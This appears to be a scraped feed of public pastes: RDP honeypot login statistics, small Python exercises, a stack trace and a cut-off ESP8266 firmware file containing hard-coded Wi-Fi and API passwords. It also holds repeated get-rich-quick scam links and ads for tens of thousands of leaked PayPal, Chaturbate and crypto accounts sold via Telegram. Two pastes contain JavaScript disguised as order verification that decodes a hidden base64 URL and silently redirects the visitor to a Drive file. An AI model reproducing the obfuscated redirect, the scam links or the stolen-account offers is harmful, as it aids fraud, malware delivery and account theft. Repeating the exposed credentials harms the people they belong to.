id,title,username,language,date,content
Q9GV4Wqj,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:18:27 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 990,
    ""80.94.95.198"": 54,
    ""211.185.207.14"": 30,
    ""91.238.181.91"": 6,
    ""71.82.170.60"": 30,
    ""194.165.16.165"": 6,
    ""38.165.7.74"": 6,
    ""205.210.31.163"": 9,
    ""152.32.252.94"": 3,
    ""193.176.22.13"": 18,
    ""62.60.188.24"": 3,
    ""167.71.75.52"": 75,
    ""52.142.43.71"": 192,
    ""156.227.234.181"": 3,
    ""205.210.31.94"": 9,
    ""221.181.44.30"": 6,
    ""88.214.50.50"": 18,
    ""191.96.106.18"": 3132,
    ""80.94.95.90"": 3,
    ""61.219.85.85"": 3,
    ""198.235.24.55"": 9,
    ""91.238.181.93"": 6,
    ""165.154.58.251"": 3,
    ""194.165.16.163"": 6,
    ""212.56.53.170"": 1635,
    ""37.61.243.211"": 3,
    ""159.89.6.147"": 600,
    ""147.185.132.210"": 9,
    ""167.94.145.97"": 3
  },
  ""asn"": {
    ""AS14259"": 990,
    ""AS204428"": 57,
    ""AS4766"": 30,
    ""AS49434"": 12,
    ""AS20115"": 30,
    ""AS48721"": 12,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS135377"": 6,
    ""Unknown"": 1671,
    ""AS215930"": 3,
    ""AS14061"": 675,
    ""AS8075"": 192,
    ""AS138152"": 3,
    ""AS9808"": 6,
    ""AS174"": 3132,
    ""AS3462"": 3,
    ""AS30781"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Gtd Internet S.A."": 990,
    ""SS-Net"": 57,
    ""Korea Telecom"": 30,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 30,
    ""Flyservers S.A."": 12,
    ""ReliableSite.Net LLC"": 6,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""SIA \""Singularity Telecom\"""": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Corporation"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile communications corporation"": 6,
    ""Cogent Communications"": 3132,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""VPN Consumer Ashburn"": 1635,
    ""DC4Data"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Gtd Internet S.A"": 990,
    ""Unmanaged LTD"": 57,
    ""Kornet"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 30,
    ""Flyservers S.A"": 12,
    ""PEG Tech Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""SIA \""Singularity Telecom\"""": 36,
    ""UAB Host Baltic"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Azure Cloud (eastus)"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile"": 6,
    ""Ipxo"": 3132,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Ucloud Information Technology"": 3,
    ""VPN Consumer Ashburn, VA, United States"": 1635,
    ""DcforData SRL"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 990,
    ""Budapest"": 57,
    ""Sejong-si"": 30,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 30,
    ""Kaunas"": 12,
    ""California"": 4809,
    ""Kowloon"": 3,
    ""New York"": 36,
    ""Tehran"": 3,
    ""North Holland"": 75,
    ""Virginia"": 192,
    ""\u014csaka"": 3,
    ""Guangdong"": 6,
    ""New Taipei City"": 3,
    ""Metro Manila"": 3,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Hesse"": 600,
    ""Michigan"": 3
  },
  ""country"": {
    ""Chile"": 990,
    ""Hungary"": 57,
    ""South Korea"": 30,
    ""France"": 15,
    ""United States"": 5070,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Iran"": 3,
    ""The Netherlands"": 75,
    ""Japan"": 3,
    ""China"": 6,
    ""Taiwan"": 3,
    ""Philippines"": 3,
    ""Germany"": 600
  },
  ""account"": {
    ""hello"": 6648,
    ""142.93.8.59"": 114,
    ""Test"": 36,
    ""QRMupMsWI"": 3,
    ""KJpCKf"": 3,
    ""wcJlYu"": 3,
    ""Administrator"": 6,
    ""hLgdNOvGE"": 3,
    ""UyvLBl"": 3,
    ""UVHSHx"": 3,
    ""Domain"": 24,
    ""Administr"": 3,
    ""hpOvyxCBc"": 3,
    ""SUcNWJ"": 3,
    ""IzgcEw"": 3,
    ""aEEaxVaWV"": 3,
    ""KOUPop"": 3,
    ""fbYjWP"": 3,
    ""(empty)"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6870
  },
  ""client_build"": {
    ""Unknown"": 6870
  },
  ""client_name"": {
    ""Unknown"": 6870
  },
  ""ip_type"": {
    ""Unknown"": 2802,
    ""hosting"": 921,
    ""hosting & proxy"": 9,
    ""mobile"": 6,
    ""proxy"": 3132
  }
}"
KgUjuGPV,Make $1000 15-MINUTES (BEGINNER) 96,vinevibes,JavaScript,Thursday 24th of April 2025 07:17:52 PM CDT," 
Pdf https://tinyurl.com/privguidee

IHrTonX4A1
"
kifd6Ybg,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:16:19 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 660,
    ""80.94.95.198"": 36,
    ""211.185.207.14"": 20,
    ""91.238.181.91"": 4,
    ""71.82.170.60"": 20,
    ""194.165.16.165"": 4,
    ""38.165.7.74"": 4,
    ""205.210.31.163"": 6,
    ""152.32.252.94"": 2,
    ""193.176.22.13"": 12,
    ""62.60.188.24"": 2,
    ""167.71.75.52"": 50,
    ""52.142.43.71"": 128,
    ""156.227.234.181"": 2,
    ""205.210.31.94"": 6,
    ""221.181.44.30"": 4,
    ""88.214.50.50"": 12,
    ""191.96.106.18"": 2088,
    ""80.94.95.90"": 2,
    ""61.219.85.85"": 2,
    ""198.235.24.55"": 6,
    ""91.238.181.93"": 4,
    ""165.154.58.251"": 2,
    ""194.165.16.163"": 4,
    ""212.56.53.170"": 1090,
    ""37.61.243.211"": 2,
    ""159.89.6.147"": 400,
    ""147.185.132.210"": 6,
    ""167.94.145.97"": 2
  },
  ""asn"": {
    ""AS14259"": 660,
    ""AS204428"": 38,
    ""AS4766"": 20,
    ""AS49434"": 8,
    ""AS20115"": 20,
    ""AS48721"": 8,
    ""AS23470"": 4,
    ""AS396982"": 24,
    ""AS135377"": 4,
    ""Unknown"": 1114,
    ""AS215930"": 2,
    ""AS14061"": 450,
    ""AS8075"": 128,
    ""AS138152"": 2,
    ""AS9808"": 4,
    ""AS174"": 2088,
    ""AS3462"": 2,
    ""AS30781"": 2,
    ""AS398705"": 2
  },
  ""isp"": {
    ""Gtd Internet S.A."": 660,
    ""SS-Net"": 38,
    ""Korea Telecom"": 20,
    ""Datacenter location PAR1 France"": 8,
    ""Charter Communications"": 20,
    ""Flyservers S.A."": 8,
    ""ReliableSite.Net LLC"": 4,
    ""Google LLC"": 24,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""SIA \""Singularity Telecom\"""": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""DigitalOcean, LLC"": 450,
    ""Microsoft Corporation"": 128,
    ""Yisu Cloud Ltd"": 2,
    ""China Mobile communications corporation"": 4,
    ""Cogent Communications"": 2088,
    ""Chunghwa Telecom Co., Ltd."": 2,
    ""VPN Consumer Ashburn"": 1090,
    ""DC4Data"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Gtd Internet S.A"": 660,
    ""Unmanaged LTD"": 38,
    ""Kornet"": 20,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Spectrum"": 20,
    ""Flyservers S.A"": 8,
    ""PEG Tech Inc"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""SIA \""Singularity Telecom\"""": 24,
    ""UAB Host Baltic"": 2,
    ""DigitalOcean, LLC"": 450,
    ""Microsoft Azure Cloud (eastus)"": 128,
    ""Yisu Cloud Ltd"": 2,
    ""China Mobile"": 4,
    ""Ipxo"": 2088,
    ""Chunghwa Telecom Co. Ltd."": 2,
    ""Ucloud Information Technology"": 2,
    ""VPN Consumer Ashburn, VA, United States"": 1090,
    ""DcforData SRL"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 660,
    ""Budapest"": 38,
    ""Sejong-si"": 20,
    ""\u00cele-de-France"": 8,
    ""Wisconsin"": 20,
    ""Kaunas"": 8,
    ""California"": 3206,
    ""Kowloon"": 2,
    ""New York"": 24,
    ""Tehran"": 2,
    ""North Holland"": 50,
    ""Virginia"": 128,
    ""\u014csaka"": 2,
    ""Guangdong"": 4,
    ""New Taipei City"": 2,
    ""Metro Manila"": 2,
    ""Auvergne-Rh\u00f4ne-Alpes"": 2,
    ""Hesse"": 400,
    ""Michigan"": 2
  },
  ""country"": {
    ""Chile"": 660,
    ""Hungary"": 38,
    ""South Korea"": 20,
    ""France"": 10,
    ""United States"": 3380,
    ""Lithuania"": 8,
    ""Hong Kong"": 2,
    ""Iran"": 2,
    ""The Netherlands"": 50,
    ""Japan"": 2,
    ""China"": 4,
    ""Taiwan"": 2,
    ""Philippines"": 2,
    ""Germany"": 400
  },
  ""account"": {
    ""hello"": 4432,
    ""142.93.8.59"": 76,
    ""Test"": 24,
    ""QRMupMsWI"": 2,
    ""KJpCKf"": 2,
    ""wcJlYu"": 2,
    ""Administrator"": 4,
    ""hLgdNOvGE"": 2,
    ""UyvLBl"": 2,
    ""UVHSHx"": 2,
    ""Domain"": 16,
    ""Administr"": 2,
    ""hpOvyxCBc"": 2,
    ""SUcNWJ"": 2,
    ""IzgcEw"": 2,
    ""aEEaxVaWV"": 2,
    ""KOUPop"": 2,
    ""fbYjWP"": 2,
    ""(empty)"": 2
  },
  ""keyboard"": {
    ""Unknown"": 4580
  },
  ""client_build"": {
    ""Unknown"": 4580
  },
  ""client_name"": {
    ""Unknown"": 4580
  },
  ""ip_type"": {
    ""Unknown"": 1868,
    ""hosting"": 614,
    ""hosting & proxy"": 6,
    ""mobile"": 4,
    ""proxy"": 2088
  }
}"
yQkW4wQX,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 330,
    ""80.94.95.198"": 18,
    ""211.185.207.14"": 10,
    ""91.238.181.91"": 2,
    ""71.82.170.60"": 10,
    ""194.165.16.165"": 2,
    ""38.165.7.74"": 2,
    ""205.210.31.163"": 3,
    ""152.32.252.94"": 1,
    ""193.176.22.13"": 6,
    ""62.60.188.24"": 1,
    ""167.71.75.52"": 25,
    ""52.142.43.71"": 64,
    ""156.227.234.181"": 1,
    ""205.210.31.94"": 3,
    ""221.181.44.30"": 2,
    ""88.214.50.50"": 6,
    ""191.96.106.18"": 1044,
    ""80.94.95.90"": 1,
    ""61.219.85.85"": 1,
    ""198.235.24.55"": 3,
    ""91.238.181.93"": 2,
    ""165.154.58.251"": 1,
    ""194.165.16.163"": 2,
    ""212.56.53.170"": 545,
    ""37.61.243.211"": 1,
    ""159.89.6.147"": 200,
    ""147.185.132.210"": 3,
    ""167.94.145.97"": 1
  },
  ""asn"": {
    ""AS14259"": 330,
    ""AS204428"": 19,
    ""AS4766"": 10,
    ""AS49434"": 4,
    ""AS20115"": 10,
    ""AS48721"": 4,
    ""AS23470"": 2,
    ""AS396982"": 12,
    ""AS135377"": 2,
    ""Unknown"": 557,
    ""AS215930"": 1,
    ""AS14061"": 225,
    ""AS8075"": 64,
    ""AS138152"": 1,
    ""AS9808"": 2,
    ""AS174"": 1044,
    ""AS3462"": 1,
    ""AS30781"": 1,
    ""AS398705"": 1
  },
  ""isp"": {
    ""Gtd Internet S.A."": 330,
    ""SS-Net"": 19,
    ""Korea Telecom"": 10,
    ""Datacenter location PAR1 France"": 4,
    ""Charter Communications"": 10,
    ""Flyservers S.A."": 4,
    ""ReliableSite.Net LLC"": 2,
    ""Google LLC"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 1,
    ""DigitalOcean, LLC"": 225,
    ""Microsoft Corporation"": 64,
    ""Yisu Cloud Ltd"": 1,
    ""China Mobile communications corporation"": 2,
    ""Cogent Communications"": 1044,
    ""Chunghwa Telecom Co., Ltd."": 1,
    ""VPN Consumer Ashburn"": 545,
    ""DC4Data"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Gtd Internet S.A"": 330,
    ""Unmanaged LTD"": 19,
    ""Kornet"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Spectrum"": 10,
    ""Flyservers S.A"": 4,
    ""PEG Tech Inc"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""SIA \""Singularity Telecom\"""": 12,
    ""UAB Host Baltic"": 1,
    ""DigitalOcean, LLC"": 225,
    ""Microsoft Azure Cloud (eastus)"": 64,
    ""Yisu Cloud Ltd"": 1,
    ""China Mobile"": 2,
    ""Ipxo"": 1044,
    ""Chunghwa Telecom Co. Ltd."": 1,
    ""Ucloud Information Technology"": 1,
    ""VPN Consumer Ashburn, VA, United States"": 545,
    ""DcforData SRL"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 330,
    ""Budapest"": 19,
    ""Sejong-si"": 10,
    ""\u00cele-de-France"": 4,
    ""Wisconsin"": 10,
    ""Kaunas"": 4,
    ""California"": 1603,
    ""Kowloon"": 1,
    ""New York"": 12,
    ""Tehran"": 1,
    ""North Holland"": 25,
    ""Virginia"": 64,
    ""\u014csaka"": 1,
    ""Guangdong"": 2,
    ""New Taipei City"": 1,
    ""Metro Manila"": 1,
    ""Auvergne-Rh\u00f4ne-Alpes"": 1,
    ""Hesse"": 200,
    ""Michigan"": 1
  },
  ""country"": {
    ""Chile"": 330,
    ""Hungary"": 19,
    ""South Korea"": 10,
    ""France"": 5,
    ""United States"": 1690,
    ""Lithuania"": 4,
    ""Hong Kong"": 1,
    ""Iran"": 1,
    ""The Netherlands"": 25,
    ""Japan"": 1,
    ""China"": 2,
    ""Taiwan"": 1,
    ""Philippines"": 1,
    ""Germany"": 200
  },
  ""account"": {
    ""hello"": 2216,
    ""142.93.8.59"": 38,
    ""Test"": 12,
    ""QRMupMsWI"": 1,
    ""KJpCKf"": 1,
    ""wcJlYu"": 1,
    ""Administrator"": 2,
    ""hLgdNOvGE"": 1,
    ""UyvLBl"": 1,
    ""UVHSHx"": 1,
    ""Domain"": 8,
    ""Administr"": 1,
    ""hpOvyxCBc"": 1,
    ""SUcNWJ"": 1,
    ""IzgcEw"": 1,
    ""aEEaxVaWV"": 1,
    ""KOUPop"": 1,
    ""fbYjWP"": 1,
    ""(empty)"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2290
  },
  ""client_build"": {
    ""Unknown"": 2290
  },
  ""client_name"": {
    ""Unknown"": 2290
  },
  ""ip_type"": {
    ""Unknown"": 934,
    ""hosting"": 307,
    ""hosting & proxy"": 3,
    ""mobile"": 2,
    ""proxy"": 1044
  }
}"
Z0Mbev8n,PayPal with Balance,iLoveToWatch,JavaScript,Thursday 24th of April 2025 07:13:59 PM CDT,36035 Accounts Posted On https://t.me/leakedbyeminem
g7hcCqca,Moving average from datastream,smj007,Python,Thursday 24th of April 2025 07:08:50 PM CDT,"class MovingAverage:

    def __init__(self, size: int):
        self.nums = []
        self.size = size
        self.running_sum = 0

    def next(self, val: int) -> float:

		# mistake done here was not defining running_sum globally
		# running_sum = 0 <-- this is wrong since you are resetting everytime 
        if len(self.nums) < self.size:
            self.running_sum += val
            self.nums.append(val)
            return (self.running_sum*1.0)/(len(self.nums))
        else:
            self.running_sum = self.running_sum + val - self.nums[0]
            self.nums = self.nums[1:]
            self.nums.append(val)
            return self.running_sum/(self.size*1.0)
        "
9WBfK4TK,EARN $900 INSTANTLY 2025⭐ NU,vinevibes,JavaScript,Thursday 24th of April 2025 07:08:35 PM CDT," 
Pdf https://tinyurl.com/privguidee

KAE5iKuoKy
"
i4hYJcmx,your purchase,anantsoftcomputing,JavaScript,Thursday 24th of April 2025 07:05:53 PM CDT,"new here https://www.dropbox.com/scl/fi/k9c0tnm7rqaio4dvw29dc/new.pdf?rlkey=bplo5rw9q7027uia1i0ilh8c7&st=a54g8xqm&dl=0
enjoy"
eVH9ShWx,js,29JeffGamez,JavaScript,Thursday 24th of April 2025 07:00:32 PM CDT,"const cars = [""Saab"", ""Volvo"", ""BMW""];"
Rjj5Mmyu,Make $1000 15-MINUTES  (BEGINNER) ME,vinevibes,JavaScript,Thursday 24th of April 2025 06:59:20 PM CDT," 
Pdf https://tinyurl.com/privguidee

zNOh5fsjLH
"
Z8GKwTN1,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:58:37 PM CDT,59633 Accounts Posted On https://t.me/leakedbyeminem
sqgQueQx,Untitled,x2LeaF,JavaScript,Thursday 24th of April 2025 06:57:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08776/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jtbs1VwN,EARN $900 INSTANTLY 2025 M6,vinevibes,JavaScript,Thursday 24th of April 2025 06:50:05 PM CDT," 
Pdf https://tinyurl.com/privguidee

n7ig1tkqrn
"
b2XPqG9D,2025-04-25T08:49:34.822392,powerampache,PHP,Thursday 24th of April 2025 06:49:33 PM CDT,"1.00-66 (66) - DB: 82
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
sM0KY6kj,Chaturbate with Tokens,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:43:15 PM CDT,16494 Accounts Posted On https://t.me/leakedbyeminem
fLwxfCaq,Make $1000 15-MINUTES (BEGINNER) 96,anajem,JavaScript,Thursday 24th of April 2025 06:40:09 PM CDT," 
Pdf https://tinyurl.com/privguidee

u82A7Gle1V
"
TSkDfFXX,maxiumum average subarray I,smj007,Python,Thursday 24th of April 2025 06:35:06 PM CDT,"class Solution:
    def findMaxAverage(self, nums: List[int], k: int) -> float:
        
        left = 0
        right = 0
        window_sum = 0
        max_window_sum = -float(""inf"")
        
        while right < len(nums):
            if nums[right] < k - 1:
                # keep adding until you expanded the
                # window enough
                window_sum = window_sum + nums[right]
                right += 1
            else:
                # add right most element assuming that left most
                # element is already inside the window
                window_sum = window_sum + nums[right]
                max_window_sum = max(window_sum, max_window_sum)

                # prepare for next iteration
                window_sum -= nums[left]
                left += 1
                right += 1

        return max_window_sum/(k*1.0)
"
TWmBJp4P,EARN $900 INSTANTLY 2025⭐ NU,anajem,JavaScript,Thursday 24th of April 2025 06:30:52 PM CDT," 
Pdf https://tinyurl.com/privguidee

STzKTmQAHJ
"
LihSGbxt,Crypto Accounts,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:27:53 PM CDT,26916 Accounts Posted On https://t.me/leakedbyeminem
SYH4jtWb,Order.js,x2LeaF,JavaScript,Thursday 24th of April 2025 06:27:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70896/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DfTsEJDD,Untitled,reaperox,C++,Thursday 24th of April 2025 06:16:08 PM CDT,"#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <ArduinoJson.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <Ticker.h>
#include <DNSServer.h>
#include <functional>
#include <WiFiClientSecure.h>

const char* CURRENT_FIRMWARE_VERSION = ""v1.0.0"";
const char* API_PASSWORD = ""mohansakthi"";

const int ledPins[] = {5, 4, 14, 12};
const int numStrips = sizeof(ledPins) / sizeof(ledPins[0]);
const int pirPin = 13;

const char* hardcoded_ssid = ""TP-Link_6525"";
const char* hardcoded_password = ""reaperox2.4g"";

const char* apSSID = ""ESP-LED-Controller-Setup"";
const char* apPassword = ""1234567890"";
const IPAddress apIP(192, 168, 4, 1);
const IPAddress apNetmask(255, 255, 255, 0);
unsigned long wifiConnectTimeout = 20000;
bool apMode = false;

const char* gh_repo_user = ""freak-head"";
const char* gh_repo_name = ""espledlocalfirm"";
String latestVersionTag = """";
String firmwareUrl = """";
bool updateAvailable = false;
bool updateInProgress = false;

enum EffectMode {
    EFFECT_NONE, EFFECT_BREATHE, EFFECT_SEQUENCE_ON, EFFECT_SEQUENCE_OFF,
    EFFECT_CHASE, EFFECT_SWELL, EFFECT_RANDOM_SOFT, EFFECT_CYCLE,
    EFFECT_CANDLE, EFFECT_WAVE, EFFECT_RAMP_UP, EFFECT_RAMP_DOWN
};
const char* effectNames[] = {
    ""none"", ""breathe"", ""sequence_on"", ""sequence_off"", ""chase"",
    ""swell"", ""random_soft"", ""cycle"", ""candle"", ""wave"",
    ""ramp_up"", ""ramp_down""
};
const int numEffects = sizeof(effectNames) / sizeof(effectNames[0]);
EffectMode currentEffect = EFFECT_NONE;
unsigned long effectStartTime = 0;
int effectStep = 0;
int effectLedBrightness[numStrips];

struct DeviceState {
    char wifiSSID[33];
    char wifiPassword[65];
    int ledBrightness[numStrips];
    int masterBrightness;
    EffectMode activeEffect;
    bool pirEnabled;
    uint32_t magic;
};
DeviceState currentState;
const uint32_t EEPROM_MAGIC_NUMBER = 0xCAFEBABE;

const int EEPROM_ADDRESS = 0;
const int EEPROM_SIZE = sizeof(DeviceState);

ESP8266WebServer server(80);
DNSServer dnsServer;
Ticker effectTicker;
Ticker pirTicker;
Ticker updateCheckTicker;
bool pirState = false;
bool lastPirReading = false;
unsigned long lastPirChangeTime = 0;
const unsigned long pirDebounceDelay = 50;

void saveStateToEEPROM(bool saveCredentials = true);
void loadStateFromEEPROM();
void applyLedState(bool forceMasterBrightness = false);
void setLedBrightness(int stripIndex, int brightness, bool persist = true);
void setMultipleLeds(const char* stripIndicesStr, int brightness, bool stateOn, bool persist = true);
void setMasterBrightness(int brightness, bool persist);
void setActiveEffect(EffectMode newEffect, bool persist);
void setPirEnabled(bool enabled, bool persist);
String getStatusJson();
void updateEffects();
void readPIR();
void checkForUpdates(bool forceCheck = false);
int compareVersions(const String& v1, const String& v2);
void startAPMode();
void startSTAMode();
bool attemptWifiConnection(const char* attemptSSID, const char* attemptPassword);
bool isAuthenticated();
bool handleCaptivePortal();

bool isAuthenticated() {
    if (!server.hasArg(""password"") || server.arg(""password"") != API_PASSWORD) {
        server.send(401, ""application/json"", ""{\""error\"":\""Unauthorized\"",\""message\"":\""Missing or incorrect password parameter\""}"");
        return false;
    }
    return true;
}

void saveStateToEEPROM(bool saveCredentials) {
    DeviceState stateToSave = currentState;
    stateToSave.magic = EEPROM_MAGIC_NUMBER;
    if(!saveCredentials) {
        DeviceState tempCreds;
        EEPROM.get(EEPROM_ADDRESS, tempCreds);
        if(tempCreds.magic == EEPROM_MAGIC_NUMBER) {
            strncpy(stateToSave.wifiSSID, tempCreds.wifiSSID, sizeof(stateToSave.wifiSSID)-1);
            strncpy(stateToSave.wifiPassword, tempCreds.wifiPassword, sizeof(stateToSave.wifiPassword)-1);
            stateToSave.wifiSSID[sizeof(stateToSave.wifiSSID)-1] = '\0';
            stateToSave.wifiPassword[sizeof(stateToSave.wifiPassword)-1] = '\0';
        } else {
             Serial.println(""Warning: Could not preserve WiFi creds during save, EEPROM might be uninitialized."");
             stateToSave.wifiSSID[0] = '\0';
             stateToSave.wifiPassword[0] = '\0';
        }
    }
    EEPROM.put(EEPROM_ADDRESS, stateToSave);
    if (!EEPROM.commit()) {
        Serial.println(""ERROR! EEPROM commit failed"");
    } else {
        Serial.println(""State saved to EEPROM."");
    }
}

void loadStateFromEEPROM() {
    Serial.println(""Loading state from EEPROM..."");
    EEPROM.get(EEPROM_ADDRESS, currentState);
    if (currentState.magic != EEPROM_MAGIC_NUMBER) {
        Serial.println(""EEPROM magic number mismatch or uninitialized. Loading defaults."");
        memset(currentState.wifiSSID, 0, sizeof(currentState.wifiSSID));
        memset(currentState.wifiPassword, 0, sizeof(currentState.wifiPassword));
        currentState.masterBrightness = 1023;
        for (int i = 0; i < numStrips; i++) currentState.ledBrightness[i] = 0;
        currentState.activeEffect = EFFECT_NONE;
        currentState.pirEnabled = false;
    } else {
        Serial.println(""EEPROM data loaded successfully."");
        currentState.wifiSSID[sizeof(currentState.wifiSSID)-1] = '\0';
        currentState.wifiPassword[sizeof(currentState.wifiPassword)-1] = '\0';
        Serial.print(""  Loaded SSID from EEPROM: ""); Serial.println(currentState.wifiSSID);
        if (currentState.activeEffect < EFFECT_NONE || currentState.activeEffect >= numEffects) {
             Serial.println(""Invalid effect loaded, defaulting to NONE."");
             currentState.activeEffect = EFFECT_NONE;
        }
        currentState.masterBrightness = constrain(currentState.masterBrightness, 0, 1023);
        for(int i = 0; i < numStrips; i++) {
            currentState.ledBrightness[i] = constrain(currentState.ledBrightness[i], 0, 1023);
        }
    }
}

void applyLedState(bool forceMasterBrightness) {
    if (currentState.activeEffect != EFFECT_NONE) {
        if (!effectTicker.active()) {
             effectStartTime = millis();
             effectStep = 0;
             for(int i=0; i < numStrips; i++) { effectLedBrightness[i] = 0; }
             effectTicker.attach_ms(50, updateEffects);
             Serial.println(""Effect ticker started."");
        }
    } else {
        if (effectTicker.active()) {
            effectTicker.detach();
            Serial.println(""Effect ticker stopped."");
        }
        for (int i = 0; i < numStrips; i++) {
            int brightnessToSet;
            if (forceMasterBrightness) {
                 brightnessToSet = (currentState.ledBrightness[i] > 0) ? currentState.masterBrightness : 0;
            } else {
                 brightnessToSet = constrain(currentState.ledBrightness[i], 0, currentState.masterBrightness);
            }
            brightnessToSet = constrain(brightnessToSet, 0, 1023);
            analogWrite(ledPins[i], brightnessToSet);
        }
    }
}

void setLedBrightness(int stripIndex, int brightness, bool persist) {
     if (stripIndex >= 0 && stripIndex < numStrips) {
        brightness = constrain(brightness, 0, 1023);
        if (currentState.ledBrightness[stripIndex] != brightness) {
            currentState.ledBrightness[stripIndex] = brightness;
            Serial.printf(""Set Strip %d direct brightness: %d\n"", stripIndex + 1, brightness);
            if (currentState.activeEffect == EFFECT_NONE) applyLedState(false);
            if (persist) saveStateToEEPROM(false);
        }
    }
}

void setMultipleLeds(const char* stripIndicesStr, int brightness, bool stateOn, bool persist) {
    bool changed = false;
